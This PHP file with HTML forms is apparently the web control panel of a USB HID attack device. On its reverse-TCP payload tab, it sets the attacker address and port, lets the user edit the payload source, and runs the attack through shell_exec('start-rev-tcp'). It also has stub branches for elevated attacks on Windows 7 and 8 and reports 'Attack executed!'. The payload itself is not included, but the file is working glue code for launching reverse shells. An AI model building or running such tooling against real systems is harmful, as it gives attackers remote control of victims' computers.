<?php
	$values = array('address', 'port');
	if (isset($_POST['action']) && $_POST['action'] == 'update' && isset($_POST['tab']) && $_POST['tab'] == 'rtcppayload'):
		$con = file_get_contents($files['reversetcp']['path']);
		foreach ($values as $v):
			if (isset($_POST[$v])):
				$new_value = '$'.$v.' = \''.strip_tags(trim($_POST[$v]))."'";
				$con = preg_replace('/\$'.$v.' = \'([0-9\.]*)\'/', $new_value, $con);
			endif;
		endforeach;		
		file_put_contents($files['reversetcp']['path'], $con);
		$message = 'Options updated!';
	elseif (isset($_POST['action']) && $_POST['action'] === 'updateSource' && isset($_POST['tab']) && $_POST['tab'] == 'rtcppayload'):
		$new_source = trim(strip_tags($_POST['source']));
		file_put_contents($files['reversetcp']['path'], $new_source);
		$message = 'Source updated!';
	elseif (isset($_GET['action']) && $_GET['action'] === 'execute' && isset($_GET['tab']) && $_GET['tab'] == 'rtcppayload'):
		$elevated = isset($_GET['elevated']) && (int) $_GET['elevated'] === 1	?	1	:0;
		$platform = isset($_GET['platform']) && in_array(strip_tags(trim($_GET['platform'])), array('windows7', 'windows8'))	?		strip_tags(trim($_GET['platform']))	:	'';
		if ($elevated === 0) {
			$res = shell_exec('start-rev-tcp');
			$message = 'Attack executed!';
		}
	elseif (!empty($platform)) {
			switch($platform):
				case 'windows7':
					//$res = shell_exec('');
					break;
				case 'windows8':
					//$res = shell_exec('');
					break;
			endswitch;
			$message = 'Attack executed!';
		} else {
			//$res = shell_exec('');
			$message = 'Invalid options!';
		}
		ob_clean();
		echo $message;
		die();
	endif;
	$con = file_get_contents($files['reversetcp']['path']);
	foreach ($values as $v):
		$match = array();
		preg_match('/\$'.$v.' = \'([0-9\.]*)\'/', $con, $match );
		if (isset($match[1])):
			$$v = $match[1];
		else:
			$$v = '';
		endif;
	endforeach;
?>
<?php require dirname(__FILE__).'/messages.php';?>
<ul class="nav nav-tabs" role="tablist">
	<li class="active"><a href="#rtcppayloadoptions" role="tab" data-toggle="tab">Options</a></li>
	<li class=""><a href="#rtcppayloadsource" role="tab" data-toggle="tab">Source</a></li>  				
</ul>
<div class="tab-content" id="rtcp-tab">
	<div id="rtcppayloadoptions" class="tab-pane fade in active">
		<form action="index.php#rtcppayload" method="POST">
			<input type="hidden" name="action" value="update" />
			<input type="hidden" name="tab" value="rtcppayload" />
			<input type="hidden" name="k" value="hid" />
			<?php foreach ($values as $v):?>
				<div class="form-group">
					<label for="input-<?php echo $v;?>"><?php echo $v;?></label>
					<input id="input-<?php echo $v;?>" class="form-control" type="text" name="<?php echo $v;?>" placeholder="<?php echo $v;?>" value="<?php echo $$v;?>" />
				</div>
			<?php endforeach;?>
			<input class="btn btn-primary btn-sm" type="submit" value="Update" name="commit">
			
		</form>
	</div>
	<div id="rtcppayloadsource" class="tab-pane fade in">
		<form action="index.php#rtcppayload" method="POST">
			<input type="hidden" name="k" value="hid" />
			<input type="hidden" name="tab" value="rtcppayload" />
			<input type="hidden" name="action" value="updateSource" />
			<div class="form-group">		
				<textarea name="source" id="input-source" class="form-control panel-body md-input" rows="20"><?php echo $con;?></textarea>
			</div>
			<input class="btn btn-primary btn-sm" type="submit" value="Update" name="commit">
		</form>
	</div>
</div> <!-- end of .tab-content -->
<div class="bottom-buttons-group">
	<form action="index.php?#rtcppayload" method="post" class="form-inline" id="rtcp-elevator-form" onsubmit="return elevatorFormSubmited('rtcp');">
		<input type="hidden" name="k" value="hid">
		<input type="hidden" name="tab" value="rtcppayload">
		<input type="hidden" name="action" value="execute"> 
		<input class="btn btn-success btn-sm fixed-btn" type="submit" value="Execute" name="commit">
		<a href="javascript:void(0);" onclick="return resetUsb('rtcp');" class="fixed-btn"><input class="btn btn-warning btn-sm" type="button" value="Reset USB" name="commit"></a>
		<label class="checkbox-inline fixed-btn" for="rtcp-elevated" style="margin-top:4px;">
  			<input type="checkbox" id="rtcp-elevated" name="elevated" value="1" onclick="elevatorClicked('rtcp');"> Admin 
		</label>
		<select class="form-control fixed-btn" name="platform" id="rtcp-platform" style="display:none;">
  			<option value="windows7">Win7</option>
  			<option value="windows8">Win8</option>
		</select>
	</form>
</div>